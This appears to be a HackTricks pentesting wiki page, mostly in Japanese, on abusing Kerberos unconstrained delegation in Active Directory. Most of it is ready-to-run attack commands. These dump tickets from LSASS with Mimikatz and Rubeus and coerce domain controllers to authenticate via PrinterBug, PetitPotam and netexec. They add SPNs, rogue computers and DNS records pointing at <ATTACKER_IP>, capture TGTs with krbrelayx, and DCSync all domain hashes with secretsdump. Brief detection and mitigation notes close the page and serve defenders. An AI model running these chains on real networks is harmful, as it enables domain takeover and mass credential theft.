# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

これは、Domain Administrator が domain 内の任意の **Computer** に設定できる機能です。すると、**user logins** がその Computer に対して行われるたびに、そのユーザーの **TGT の copy** が DC によって提供される **TGS の中に送られ**、**LSASS のメモリに保存**されます。なので、そのマシンで Administrator 権限を持っていれば、**tickets をダンプして users を impersonate** でき、任意のマシン上でそれが可能です。

つまり、Domain admin が "Unconstrained Delegation" 機能が有効な Computer にログインし、あなたがそのマシン上で local admin 権限を持っている場合、ticket をダンプして Domain Admin をどこでも impersonate できるようになります（domain privesc）。

この属性を持つ **Computer objects** は、[userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) 属性に [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) が含まれているかどうかで **find** できます。これは ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ という LDAP filter で行えます。powerview がやっているのもこれです:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
**Mimikatz** または **Rubeus** を使って Administrator（または被害者ユーザー）のチケットをメモリに読み込み、[**Pass the Ticket**](pass-the-ticket.md)** を行う。**\
詳細: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**ired.team にある Unconstrained delegation についての詳細情報。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

攻撃者が **"Unconstrained Delegation" が許可されたコンピュータを侵害** できた場合、**Print server** をだましてそのコンピュータに **自動ログイン** させ、サーバーのメモリ内に **TGT** を保存させることができる。\
その後、攻撃者は **Pass the Ticket attack** を実行して、Print server コンピュータアカウントとして **なりすまし** を行うことができる。

任意のマシンに print server をログインさせるには、[**SpoolSample**](https://github.com/leechristensen/SpoolSample) を使える:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
If the TGT if from a domain controller, you could perform a [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) and obtain all the hashes from the DC.\
[**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

こちらで、**認証を強制する**他の方法を確認できます:


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

**Kerberos** を使って被害者があなたの unconstrained-delegation ホストに認証するようにする他の coercion primitive でも動作します。現代の環境では、これは多くの場合、到達可能な RPC surface に応じて、従来の PrinterBug の流れを **PetitPotam**、**DFSCoerce**、**ShadowCoerce**、**MS-EVEN**、または **WebClient/WebDAV** ベースの coercion に置き換えることを意味します。

### unconstrained delegation を持つ user/service account の悪用

unconstrained delegation は **computer objects に限定されません**。**user/service account** も `TRUSTED_FOR_DELEGATION` として設定できます。その場合の実務上の要件は、その account が **自分が所有する SPN** に対する Kerberos service tickets を受け取ることです。

これにより、非常に一般的な 2 つの offensive path が生まれます。

1. unconstrained-delegation の **user account** の password/hash を compromise し、その同じ account に **SPN を追加**する。
2. その account にはすでに 1 つ以上の SPN があるが、そのうちの 1 つが **古い/廃止済みの hostname** を指している; 欠落している **DNS A record** を再作成するだけで、SPN の set を変更せずに authentication flow を hijack できます。

Minimal Linux flow:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notes:

- これは、unconstrained principal が **service account** であり、joined host 上での code execution ではなく、その credentials だけを持っている場合に特に有用です。
- target user がすでに **stale SPN** を持っている場合、対応する **DNS record** を再作成するほうが、AD に新しい SPN を書き込むよりも noisy でないことがあります。
- 最近の Linux 中心の tradecraft では `addspn.py`, `dnstool.py`, `krbrelayx.py`、そして 1 つの coercion primitive を使います。chain を完了するのに Windows host を触る必要はありません。

### Attacker-created computer を使った Unconstrained Delegation の abuse

現代の domains では `MachineAccountQuota > 0`（default 10）であることが多く、認証済みの principal なら誰でも最大 N 個の computer objects を作成できます。さらに `SeEnableDelegationPrivilege` token privilege（または同等の権限）を持っている場合、新しく作成した computer を unconstrained delegation を信頼するように設定でき、特権システムから入ってくる TGT を harvest できます。

High-level flow:

1) 自分が制御する computer を作成する
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) ドメイン内で fake hostname を解決可能にする
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) 攻撃者が制御するコンピュータで Unconstrained Delegation を有効化する
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
なぜこれが機能するのか: unconstrained delegation では、delegation-enabled なコンピュータ上の LSA が inbound TGT をキャッシュする。DC や privileged server をだましてあなたの fake host に authenticate させると、その machine TGT が保存され、export できる。

4) export mode で krbrelayx を起動し、Kerberos material を準備する
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) DC/サーバーから認証を強制的にあなたの偽ホストへ送らせる
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx は、マシンが認証したときに ccache ファイルを保存します。たとえば、次のとおりです:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) 捕捉した DC マシン TGT を使用して DCSync を実行する
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Notes and requirements:

- `MachineAccountQuota > 0` は、権限のない computer 作成を有効にする。それ以外の場合は明示的な権限が必要。
- computer に `TRUSTED_FOR_DELEGATION` を設定するには `SeEnableDelegationPrivilege`（または domain admin）が必要。
- 偽のホストへの名前解決（DNS A record）を確保し、DC が FQDN で到達できるようにする。
- coercion には実行可能な vector が必要（PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, など）。可能なら DC ではこれらを無効化する。
- 被害者 account が **"Account is sensitive and cannot be delegated"** に設定されている、または **Protected Users** のメンバーである場合、forward された TGT は service ticket に含まれないため、この chain では再利用可能な TGT は得られない。
- **Credential Guard** が認証側の client/server で有効な場合、Windows は **Kerberos unconstrained delegation** をブロックするため、オペレータ視点では有効に見える coercion path でも失敗することがある。

Detection and hardening ideas:

- UAC `TRUSTED_FOR_DELEGATION` が設定されたときの Event ID 4741（computer account created）および 4742/4738（computer/user account changed）をアラートする。
- domain zone における異常な DNS A-record 追加を監視する。
- 予期しない host からの 4768/4769 の急増、および DC 以外の host への DC-authentications を監視する。
- `SeEnableDelegationPrivilege` を最小限のセットに制限し、可能なら `MachineAccountQuota=0` に設定し、DC で Print Spooler を無効化する。LDAP signing と channel binding を強制する。

### Mitigation

- DA/Admin の logins を特定の services に限定する
- 特権 account に "Account is sensitive and cannot be delegated" を設定する。

## References

- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
- harmj0y – S4U2Pwnage: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
- ired.team – Domain compromise via unrestricted delegation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
- krbrelayx: https://github.com/dirkjanm/krbrelayx
- Impacket addcomputer.py: https://github.com/fortra/impacket
- BloodyAD: https://github.com/CravateRouge/bloodyAD
- netexec (CME fork): https://github.com/Pennyw0rth/NetExec
- Praetorian – Unconstrained Delegation in Active Directory: https://www.praetorian.com/blog/unconstrained-delegation-active-directory/
- Microsoft Learn – Protected Users Security Group: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

{{#include ../../banners/hacktricks-training.md}}
